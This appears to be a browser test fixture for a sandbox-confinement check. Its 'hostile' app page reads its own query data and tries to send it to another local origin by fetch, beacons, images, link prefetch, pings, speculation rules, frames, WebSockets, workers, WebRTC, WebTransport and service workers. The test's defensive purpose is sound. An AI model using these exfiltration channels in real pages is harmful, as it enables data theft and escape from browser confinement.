/**
 * The page of a custom app that reads its own data as the promote checks'
 * checker and then tries every way out a page has. Browser code, served by
 * `hostile-app.ts` to a REAL Chromium (`checks/browser-confine.real.test.ts`);
 * nothing imports it. `window.__HOSTILE__` names the ports of "another
 * origin" on this machine and the app's workspace.
 *
 * It tells the app what it saw (`report?…`) and only then says it is ready,
 * so a check that waited for the beacon has seen every attempt end.
 */

/* global window, document, navigator, location, fetch, Image, WebSocket, Worker, Blob, URL */

(() => {
  const p = window.__HOSTILE__;
  const away = `http://127.0.0.1:${p.other}`;
  const said = {};
  const late = (ms) => new Promise((resolve) => setTimeout(() => resolve("no answer"), ms));
  const settle = (work) =>
    Promise.race([
      work.then(
        () => "answered",
        (e) => `failed: ${e.name}`
      ),
      late(2500)
    ]);
  const socket = (url) =>
    Promise.race([
      new Promise((resolve) => {
        const ws = new WebSocket(url);
        ws.onopen = () => resolve("open");
        ws.onerror = () => resolve("error");
        ws.onclose = (e) => resolve(`closed ${e.code}`);
      }),
      late(2500)
    ]);

  /** The app's own data, read as the checker (allowed, and answered), then sent away by request. */
  async function byRequest() {
    const rows = await fetch(`/api/projects/${p.ws}/query`, { method: "POST", body: "SELECT 1" })
      .then((r) => r.text())
      .catch(() => "");
    said.rows = rows;
    const d = encodeURIComponent(rows);
    said.fetch = await settle(fetch(`${away}/fetch?d=${d}`, { mode: "no-cors" }));
    said.post = await settle(
      fetch(`${away}/post`, { method: "POST", body: rows, mode: "no-cors" })
    );
    said.otherPort = await settle(fetch(`http://localhost:${p.other}/other-port?d=${d}`));
    // A read the check passes, answered with a redirect away; and one that leaves on its second hop.
    said.redirect = await settle(fetch("/api/redirect-away", { mode: "no-cors" }));
    said.twoHops = await settle(fetch("hop", { mode: "no-cors" }));
    navigator.sendBeacon(`${away}/beacon`, rows);
    new Image().src = `${away}/img?d=${d}`;
  }

  /** The ways a document asks for something without a script calling `fetch`. */
  async function byMarkup() {
    for (const rel of ["prefetch", "preload", "preconnect", "dns-prefetch", "modulepreload"]) {
      const link = document.createElement("link");
      link.rel = rel;
      link.href = `${away}/link-${rel}`;
      if (rel === "preload") link.as = "fetch";
      document.head.append(link);
    }
    const pinged = document.createElement("a");
    pinged.href = "#pinged";
    pinged.ping = `${away}/ping`;
    document.body.append(pinged);
    pinged.click();
    const speculation = document.createElement("script");
    speculation.type = "speculationrules";
    speculation.textContent = JSON.stringify({
      prefetch: [{ source: "list", urls: [`${away}/speculation`] }]
    });
    document.head.append(speculation);
    const framed = document.createElement("iframe");
    framed.src = `${away}/frame`;
    document.body.append(framed);
    window.open(`${away}/popup`);
  }

  /** Sockets: from the page, to the app's own origin, and from a worker. */
  async function bySocket() {
    said.socket = await socket(`ws://127.0.0.1:${p.other}/socket`);
    said.ownSocket = await socket(`ws://${location.host}/own-socket`);
    said.socketStream = typeof window.WebSocketStream;
    const source = `onmessage = async (e) => {
      const out = {};
      out.fetch = await fetch(e.data.http, { mode: "no-cors" }).then(() => "answered", (err) => "failed: " + err.name);
      const socket = (url) => new Promise((resolve) => {
        const ws = new WebSocket(url);
        ws.onopen = () => resolve("open");
        ws.onerror = () => resolve("error");
        setTimeout(() => resolve("no answer"), 2500);
      });
      out.socket = await socket(e.data.ws);
      out.ownSocket = await socket(e.data.own);
      postMessage(out);
    }`;
    const worker = new Worker(URL.createObjectURL(new Blob([source], { type: "text/javascript" })));
    const answered = new Promise((resolve) => {
      worker.onmessage = (e) => resolve(e.data);
    });
    worker.postMessage({
      http: `${away}/worker-fetch`,
      ws: `ws://127.0.0.1:${p.other}/worker-socket`,
      own: `ws://${location.host}/worker-own-socket`
    });
    said.worker = await Promise.race([answered, late(6000)]);
  }

  /** What is not HTTP at all: a peer connection (STUN over UDP, TURN over TCP) and WebTransport (QUIC). */
  async function byPeer() {
    said.peerConnection = typeof window.RTCPeerConnection;
    // A fresh frame is a fresh set of constructors, where nothing took them away there too.
    const frame = document.createElement("iframe");
    document.body.append(frame);
    const fresh = frame.contentWindow;
    said.framePeerConnection = typeof fresh.RTCPeerConnection;
    const Connection =
      window.RTCPeerConnection ?? window.webkitRTCPeerConnection ?? fresh.RTCPeerConnection;
    if (Connection) {
      const peer = new Connection({
        iceServers: [
          { urls: `stun:127.0.0.1:${p.udp}` },
          { urls: `turn:127.0.0.1:${p.tcp}?transport=tcp`, username: "rows", credential: "x" }
        ]
      });
      peer.createDataChannel("rows");
      await peer.setLocalDescription(await peer.createOffer());
    }
    if (window.WebTransport) {
      said.transport = await settle(new window.WebTransport(`https://127.0.0.1:${p.udp}/`).ready);
    }
  }

  /** A service worker, asked for by each way a page has to ask for one. */
  async function byServiceWorker() {
    const container = navigator.serviceWorker;
    if (!container) {
      said.serviceWorker = "no container";
      return;
    }
    const frame = document.createElement("iframe");
    document.body.append(frame);
    const ways = [
      () => container.register("sw.js"),
      () => window.ServiceWorkerContainer.prototype.register.call(container, "sw.js"),
      () => frame.contentWindow.ServiceWorkerContainer.prototype.register.call(container, "sw.js")
    ];
    said.serviceWorker = [];
    for (const way of ways) {
      const got = await way().then(
        (registration) => (registration ? "registered" : "nothing"),
        (e) => `refused: ${e.name}`
      );
      said.serviceWorker.push(got);
    }
    said.controlled = Boolean(container.controller);
  }

  /** Every part in turn, then what was seen, then the beacon. A part that throws says so. */
  async function run() {
    for (const part of [byRequest, byMarkup, bySocket, byPeer, byServiceWorker]) {
      await part().catch((e) => {
        said[part.name] = String(e);
      });
    }
    await late(1500);
    await fetch(`report?${encodeURIComponent(JSON.stringify(said))}`).catch(() => undefined);
    await fetch("__oxy/beacon", { method: "POST", body: '{"events":[{"n":"oxy-app-ready"}]}' });
  }

  // A page that could not even send its beacon leaves the check waiting, which is its answer.
  run().catch(() => undefined);
})();
